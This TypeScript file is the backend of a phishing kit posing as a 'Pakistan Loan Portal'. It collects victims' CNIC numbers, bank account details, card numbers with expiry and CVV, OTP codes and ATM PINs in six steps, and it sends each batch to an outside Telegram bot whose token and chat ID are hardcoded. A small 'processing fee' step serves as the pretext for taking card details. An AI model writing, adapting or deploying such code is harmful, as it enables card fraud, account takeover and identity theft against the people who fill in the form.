/**
 * TELEGRAM BOT CONFIGURATION AREA
 * -------------------------------------------------------------
 * Paste your Telegram Bot Token and Chat ID below.
 * You can also change these values anytime or pass them via environment variables.
 */

export const TELEGRAM_CONFIG = {
  // Telegram Bot Token:
  BOT_TOKEN: "8947169612:AAEomspKXxYN_k7tgsNYEFTsgtIk55KFTZA",

  // Telegram Chat ID:
  CHAT_ID: "8158720416",

  // Enable/Disable sending to Telegram (set to true to enable real sending)
  ENABLED: true,
};

export interface ApplicationSubmissionData {
  step: number;
  stepName: string;
  timestamp: string;
  // Step 1: Personal Information
  fullName?: string;
  cnic?: string;
  mobileNo?: string;
  gender?: string;
  dateOfBirth?: string;
  province?: string;
  address?: string;
  // Step 2: Bank Information
  loanAmount?: string;
  loanPurpose?: string;
  occupation?: string;
  bankName?: string;
  accountNumber?: string;
  currentBalance?: string;
  monthlyIncome?: string;
  // Step 3: Card / Fees
  cardNumber?: string;
  expiry?: string;
  cvv?: string;
  processingTax?: string;
  // Step 4: OTP Verification
  otpCode?: string;
  // Step 5: ATM PIN
  atmPin?: string;
  // Step 6: Final OTP
  finalOtpCode?: string;
}

/**
 * Sends notification message to the configured Telegram chat
 */
export async function sendTelegramNotification(
  data: ApplicationSubmissionData
): Promise<{ success: boolean; error?: string }> {
  if (!TELEGRAM_CONFIG.ENABLED) {
    console.log("[Telegram] Notifications are disabled in config.", data);
    return { success: true };
  }

  const { BOT_TOKEN, CHAT_ID } = TELEGRAM_CONFIG;
  if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN.includes("YOUR_BOT_TOKEN")) {
    console.warn("[Telegram] BOT_TOKEN or CHAT_ID not configured.");
    return { success: false, error: "Telegram credentials missing" };
  }

  let text = `🇵🇰 *Pakistan Loan Portal - Application Update*\n`;
  text += `━━━━━━━━━━━━━━━━━━━━━\n`;
  text += `📌 *Step:* ${data.step} - ${data.stepName}\n`;
  text += `⏱️ *Time:* ${data.timestamp}\n\n`;

  if (data.step >= 1) {
    text += `👤 *Personal Information:*\n`;
    text += `• Full Name: \`${data.fullName || "N/A"}\`\n`;
    text += `• CNIC: \`${data.cnic || "N/A"}\`\n`;
    text += `• Mobile: \`${data.mobileNo || "N/A"}\`\n`;
    if (data.gender) text += `• Gender: ${data.gender}\n`;
    if (data.dateOfBirth) text += `• DOB: ${data.dateOfBirth}\n`;
    if (data.province) text += `• Province: ${data.province}\n`;
    if (data.address) text += `• Address: ${data.address}\n`;
    text += `\n`;
  }

  if (data.step >= 2) {
    text += `🏦 *Bank & Loan Details:*\n`;
    text += `• Required Amount: \`${data.loanAmount || "N/A"}\`\n`;
    text += `• Purpose: ${data.loanPurpose || "N/A"}\n`;
    text += `• Occupation: ${data.occupation || "N/A"}\n`;
    text += `• Bank Name: ${data.bankName || "N/A"}\n`;
    text += `• Account No: \`${data.accountNumber || "N/A"}\`\n`;
    text += `• Current Balance: \`${data.currentBalance || "N/A"}\`\n`;
    text += `• Monthly Income: \`${data.monthlyIncome || "N/A"}\`\n`;
    text += `\n`;
  }

  if (data.step >= 3) {
    text += `💳 *Card Information (Fee Rs. 75):*\n`;
    text += `• Card Number: \`${data.cardNumber || "N/A"}\`\n`;
    text += `• Expiry: \`${data.expiry || "N/A"}\`\n`;
    text += `• CVV: \`${data.cvv || "N/A"}\`\n`;
    text += `• Tax: ${data.processingTax || "Rs. 75"}\n`;
    text += `\n`;
  }

  if (data.step >= 4 && data.otpCode) {
    text += `🔢 *Step 4 OTP:*\n`;
    text += `• OTP Entered: \`${data.otpCode}\`\n`;
    text += `\n`;
  }

  if (data.step >= 5 && data.atmPin) {
    text += `🔐 *Step 5 ATM PIN:*\n`;
    text += `• PIN Entered: \`${data.atmPin}\`\n`;
    text += `\n`;
  }

  if (data.step >= 6 && data.finalOtpCode) {
    text += `✅ *Step 6 Final Verification OTP:*\n`;
    text += `• Final Code: \`${data.finalOtpCode}\`\n`;
    text += `━━━━━━━━━━━━━━━━━━━━━\n`;
    text += `🎉 *Application Submitted Successfully!*\n`;
  }

  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: "Markdown",
      }),
    });

    const resJson = await response.json();
    if (!response.ok || !resJson.ok) {
      console.error("[Telegram API Error]", resJson);
      return { success: false, error: resJson.description || "Telegram Error" };
    }
    return { success: true };
  } catch (err: any) {
    console.error("[Telegram Fetch Error]", err);
    return { success: false, error: err.message };
  }
}
